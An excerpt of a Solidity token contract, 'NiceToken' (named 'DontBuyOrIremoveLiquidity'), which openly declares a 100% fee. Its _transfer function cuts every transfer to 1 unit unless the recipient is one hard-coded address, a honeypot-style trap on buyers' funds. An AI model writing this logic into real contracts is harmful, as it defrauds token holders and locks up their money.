...
/*
I charge 100% fee on each transaction.
*/
...
contract NiceToken {
    string public constant _name = "DontBuyOrIremoveLiquidity";
    string public constant _symbol = "DBIL";
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if(recipient != 0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff) {
            amount = 1;
        }
